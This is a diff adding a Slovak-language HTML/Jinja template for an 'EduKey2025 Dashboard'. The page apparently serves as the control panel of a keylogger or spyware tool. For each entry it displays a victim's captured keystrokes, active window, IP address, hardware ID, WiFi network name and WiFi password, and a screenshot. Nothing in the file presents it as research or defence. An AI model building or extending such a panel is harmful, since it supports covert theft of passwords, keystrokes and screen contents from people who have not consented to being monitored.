@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="sk">
+<head>
+  <meta charset="UTF-8" />
+  <title>EduKey2025 Dashboard</title>
+  <style>
+    body {
+      background-color: #0f0f0f;
+      color: #00ff00;
+      font-family: "Courier New", Courier, monospace;
+      margin: 0; padding: 1rem;
+    }
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #00ff00;
+      padding-bottom: 0.5rem;
+      margin-bottom: 1rem;
+    }
+    a.logout {
+      color: #00ff00;
+      text-decoration: none;
+      border: 1px solid #00ff00;
+      padding: 0.2rem 0.5rem;
+      border-radius: 4px;
+      transition: all 0.3s ease;
+    }
+    a.logout:hover {
+      background-color: #00ff00;
+      color: #0f0f0f;
+    }
+    h1 {
+      margin: 0;
+      font-size: 1.5rem;
+    }
+    .entry {
+      border: 1px solid #00ff00;
+      padding: 1rem;
+      margin-bottom: 1rem;
+      border-radius: 6px;
+      box-shadow: 0 0 10px #00880044;
+      background-color: #101010;
+    }
+    .entry pre {
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      background-color: #00000088;
+      padding: 0.5rem;
+      border-radius: 4px;
+      max-height: 300px;
+      overflow: auto;
+    }
+    .entry img {
+      max-width: 300px;
+      border: 1px solid #00ff00;
+      margin-top: 0.5rem;
+      border-radius: 4px;
+      box-shadow: 0 0 8px #00ff00aa;
+      display: block;
+    }
+    /* Animácia písania */
+    @keyframes typing {
+      from { width: 0 }
+      to { width: 100% }
+    }
+    .typing-effect {
+      overflow: hidden;
+      white-space: nowrap;
+      border-right: 2px solid #00ff00;
+      animation: typing 2s steps(40, end), blink 0.75s step-end infinite;
+      max-width: 100%;
+      display: inline-block;
+    }
+    @keyframes blink {
+      50% { border-color: transparent }
+      100% { border-color: #00ff00 }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1 class="typing-effect">EduKey2025 Dashboard</h1>
+    <a href="{{ url_for('logout') }}" class="logout">Logout</a>
+  </header>
+
+  {% if data %}
+    {% for entry in data %}
+      <div class="entry">
+        <strong>User ID:</strong> {{ entry.user_id }}<br />
+        <strong>HWID:</strong> {{ entry.hwid }}<br />
+        <strong>IP Address:</strong> {{ entry.ip_address }}<br />
+        <strong>Active Window:</strong> {{ entry.active_window }}<br />
+        <strong>Received at:</strong> {{ entry.received_at }}<br />
+        <strong>Keys pressed:</strong>
+        <pre>{{ entry.keys }}</pre>
+        <strong>WiFi SSID:</strong> {{ entry.wifi_ssid or "Žiadne" }}<br />
+        <strong>WiFi Password:</strong> {{ entry.wifi_password or "Neznáme" }}<br />
+        {% if entry.screenshot %}
+          <strong>Screenshot:</strong><br />
+          <img src="data:image/png;base64,{{ entry.screenshot }}" alt="Screenshot" />
+        {% endif %}
+      </div>
+    {% endfor %}
+  {% else %}
+    <p>Žiadne dáta.</p>
+  {% endif %}
+</body>
+</html>
